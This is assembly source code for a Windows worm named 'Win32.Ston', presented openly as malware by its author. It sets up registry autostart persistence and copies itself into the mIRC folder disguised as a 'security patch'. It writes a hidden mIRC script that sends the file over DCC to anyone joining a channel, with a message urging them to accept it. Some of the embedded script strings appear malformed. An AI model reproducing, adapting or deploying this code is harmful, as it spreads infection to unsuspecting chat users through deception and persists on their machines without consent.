;--------------------------------------------------------------------+
;name:          Win32.Ston                                           |
;author:        Hutley / RRLF                                        |
;date           30.Jun.2006                                          |
;webpage:       www.Hutley.de.vu                                     |
;--------------------------------------------------------------------+
;       *** FEATURES                                                 |
;               - Start with Windows by Registry                     |
;               - Spread by mIRC using a script file                 |
;                                                                    |
;       *** THANX                                                    |
;               - DiA, SPTH, blueowl, dr3f                           |
;                                                                    |
;       *** COMMENT!                                                 |
;               My first that spread by mIRC!                        |
;--------------------------------------------------------------------+

include '%fasminc%\win32ax.inc'

.data
        about                db  "Win32.Ston by Hutley / RRLF", 0
        _windir              rb  255d
        ston_file            rb  255d
        ston_new             rb  255d
        ; registry variables
        reg_subkey           equ "Software\Microsoft\Windows\CurrentVersion\Run", 0
        reg_result           db  ?
        reg_value            equ "Ston", 0
        ; infect mIRC
        mirc_reg             equ "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC", 0
        mirc_reg_rst         db  ?
        mirc_path            rb  255d
        mirc_size            db  255d
        mirc_file            equ "\mIRC_Security_Patch.exe", 0
        mirc_ston            equ "ston.mrc", 0
        mirc_ston_hdl        dd ?
        mirc_dccsend         db ".dcc send -clm $nick ",0
        mirc_content         db "; Win32.Ston.Script by Hutley/RRLF",13,10,\
                                "",13,10,\
                                "on 1:JOIN:#:if ($nick != $me) }",13,10
        mirc_ctnt_size       = $ - mirc_content
        mirc_other           db 256 dup(?)
        mirc_rest            db 13,10,".privmsg $nick Accept, its a very nice one!",13,10,"}"
        mirc_writen          dd 0
        ;mirc.ini
        ini_file             db 0

.code

start:
     call autostart                   ; ok! auto start with windows
     call infect_mirc                 ; ok! copy in mirc folder
     call write_mirc.ini              ; write in mirc.ini

     invoke ExitProcess,\             ; that's all folks!
            0
.end start

proc write_mirc.ini
     invoke lstrcat,\
            ini_file,\
            "\mirc.ini"

     invoke WritePrivateProfileString,\
            "rfiles",\
            "n2",\
            "ston.mrc",\
            ini_file
     ret
endp

proc infect_mirc
     invoke RegOpenKeyEx,\
            HKEY_LOCAL_MACHINE,\
            mirc_reg,\
            0,\
            KEY_READ,\
            mirc_reg_rst

     cmp    eax, 0                    ; any error?
     jne    error                     ; then exit
                                      ; whithout error, then continue
     invoke RegQueryValueEx,\
            dword[mirc_reg_rst],\
            "UninstallString",\
            0,\
            0,\
            mirc_path,\
            mirc_size

     invoke lstrlen,\
            mirc_path

     mov    esi, mirc_path
     sub    eax, 21                   ; 12 to mirc.exe | 21 to C:\mirc\
     mov    byte [esi + eax], 0
     inc    esi

     invoke RegCloseKey,\
            mirc_reg_rst

     invoke GetModuleFileName,\
            0,\
            ston_file,\
            255d

     invoke lstrcpy,\
            ston_new,\
            esi

     invoke lstrcpy,\
            ini_file,\
            esi

     invoke lstrcat,\
            ston_new,\
            mirc_file

     invoke lstrcpy,\
            mirc_other,\
            ".dcc send -clm $nick "

     invoke lstrcat,\
            mirc_other,\
            esi

     invoke lstrcat,\
            mirc_other,\
            mirc_file

     invoke CopyFile,\                ; let´s copy in mIRC folder
            ston_file,\
            ston_new,\
            FALSE

     invoke lstrlen,\
            ston_new
     
     mov    esi, ston_new
     sub    eax, 23
     mov    byte[esi + eax], 0
     
     invoke lstrcat,\
            esi,\
            mirc_ston
     
     invoke CreateFile,\              ; create the script file (ston.mrc)
            esi,\
            GENERIC_WRITE,\
            0,\
            0,\
            CREATE_ALWAYS,\
            FILE_ATTRIBUTE_HIDDEN,\
            0
                
     cmp    eax, INVALID_HANDLE_VALUE ; protection of erros
     je     error                     ; error? get out!
     mov    dword[mirc_ston_hdl], eax ; handle of file creation in variable

     invoke WriteFile,\
            dword[mirc_ston_hdl],\
            mirc_content,\
            mirc_ctnt_size,\
            mirc_writen,\
            0

     invoke lstrlen,\
            mirc_other

     invoke WriteFile,\
            dword[mirc_ston_hdl],\
            mirc_other,\
            eax,\
            mirc_writen,\
            0

     invoke lstrlen,\
            mirc_rest

     invoke WriteFile,\
            dword[mirc_ston_hdl],\
            mirc_rest,\
            eax,\
            mirc_writen,\
            0

     invoke CloseHandle,\
            dword[mirc_ston_hdl]

     error:                           ; if exist error i go to here
     invoke RegCloseKey,\             ; close the opened key
            mirc_reg_rst
     ret
endp


proc autostart                        ; auto start the virus by win registry
     invoke GetWindowsDirectory,\     ; let's copy to windows dir
            _windir,\
            255d

     invoke GetModuleFileName,\
            0,\
            ston_file,\
            255d

     invoke lstrcpy,\
            ston_new,\
            _windir

     invoke lstrcat,\
            ston_new,\
            "\WinStone.exe"

     invoke CopyFile,\
            ston_file,\
            ston_new,\
            FALSE

     invoke lstrcpy,\
            ston_file,\
            ston_new

     invoke RegOpenKeyEx,\            ; add to registry
            HKEY_LOCAL_MACHINE,\
            reg_subkey,\
            0,\
            KEY_SET_VALUE,\
            reg_result

     invoke lstrlen,\
            ston_file

     invoke RegSetValueEx,\
            dword[reg_result],\
            reg_value,\
            0,\
            REG_SZ,\
            ston_file,\
            eax

     invoke RegCloseKey,\
            dword[reg_result]
     ret
endp
  